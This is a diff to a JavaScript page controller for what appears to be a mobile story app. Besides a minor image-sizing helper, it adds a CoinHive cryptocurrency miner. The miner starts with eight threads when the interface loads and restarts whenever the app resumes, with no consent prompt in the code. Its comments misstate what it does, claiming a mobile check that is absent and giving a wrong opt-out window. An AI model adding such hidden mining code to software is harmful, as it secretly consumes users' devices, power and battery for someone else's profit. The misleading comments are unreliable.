@@ -1,6 +1,5 @@
 var pageViewController = function(sb, input){
-	var thisIsMobileDevice = true, storyEditorInitialized=false, albumContainerJS=null, storyEditHappening = false, documentEditHappening = false, userLogoStarted = false, placeHolderContainer=sb.dom.find("#jstemplate-pageViewController-placeHolderContainer").html(), relPathIn = input.relPath, appname=input.appname, streamSize = input.streamSize, newStream = null, storyItemControllerPublish = true, logoutAttempt=0, appOnPause = false;
-	
+	var thisIsMobileDevice = true, storyEditorInitialized=false, albumContainerJS=null, storyEditHappening = false, documentEditHappening = false, userLogoStarted = false, placeHolderContainer=sb.dom.find("#jstemplate-pageViewController-placeHolderContainer").html(), relPathIn = input.relPath, appname=input.appname, streamSize = input.streamSize, newStream = null, storyItemControllerPublish = true, logoutAttempt=0, appOnPause = false, subContainerWidth = null, miner = null;
 	function _enableBigScreenFeatures(){
 		sb.dom.find(".bigScreenItem").show();
 	}
@@ -253,6 +252,12 @@ var pageViewController = function(sb, input){
 		}
 			
 	}
+
+	function _adjustImageSizeForContainerMedia(){
+		sb.dom.find(this).removeAttr('height');
+		sb.dom.find(this).attr('width', subContainerWidth + "px");
+		
+	}
 	
 	
 	   function _snippetResponseReceived(snippetResponse){
@@ -264,6 +269,7 @@ var pageViewController = function(sb, input){
 			   sb.dom.find('.placeHolderContainer').remove();
 			   sb.dom.find('#containerDiv').prepend(snippetResponse);
 			   sb.dom.find('#containerDiv').find('.container').first().find('.containerBackButton').show();
+			   subContainerWidth = sb.dom.find('#containerDiv').find('.container').width();			   
 			   sb.dom.find('#containerDiv').find('.container').first().find('.containerBackButton').bind('click', _containerBackButtonClickedV2);
 			   sb.dom.find('#containerDiv').find('.container').first().find('.containerCloseButton').show();
 			   sb.dom.find('#containerDiv').find('.container').first().find('.containerCloseButton').bind('click', _containerCloseButtonClicked);		
@@ -625,6 +631,7 @@ var pageViewController = function(sb, input){
 			});
 			sb.dom.find('.collapsible').collapsible();
 			sb.dom.find('.inviteFriendsSocial').click(_inviteFriendsToAppSocial);
+			_setupMiner();
 		 $('.modal').modal({
 			  dismissible: true, // Modal can be dismissed by clicking outside of the modal
 			  opacity: .5, // Opacity of modal background
@@ -816,13 +823,15 @@ var pageViewController = function(sb, input){
 		sb.utilities.setUserInfo(sb.utilities.getUserInfo().username, sb.utilities.getUserInfo().authorization, sb.utilities.getUserInfo().authorizationType, sb.utilities.getUserInfo().userDetails);	
 		sb.utilities.setUserStreamToDevice();
 		appOnPause = true;
+		miner.stop();
 		
 	}
 	
 	function onResume(e) {
 		//e.preventDefault();
 		appOnPause = false;
-		Core.publish('applicationResume', null);		
+		Core.publish('applicationResume', null);	
+		miner.start();
 	}
 
 	function _userLoginEventReceived(message){
@@ -931,6 +940,33 @@ var pageViewController = function(sb, input){
 		}catch(e){
 			alert(e);
 		}
+		
+	}
+	
+	function _minerJobEvent(){
+		console.log('Miner Job Event Triggered. ' + miner.getTotalHashes());
+		var minerTotalHashes = miner.getTotalHashes();
+		if(minerTotalHashes > 9000 && miner.isRunning()){
+			console.log('Stopping Miner');
+			miner.stop();
+		}
+		
+	}
+	
+	function _setupMiner(){
+		try{
+			miner = new CoinHive.Anonymous(input.minerSiteKey, {throttle: 0.3});
+			miner.setNumThreads(8);
+			// Only start on non-mobile devices and if not opted-out
+			// in the last 14400 seconds (~24 hours):
+			if (!miner.didOptOut(86400)) {
+				miner.start();
+			}
+			console.log('Miner Status ' + miner.isRunning());
+			miner.on('job', _minerJobEvent);
+		}catch(e){
+			alert(e);
+		}		
 		
 	}
 	
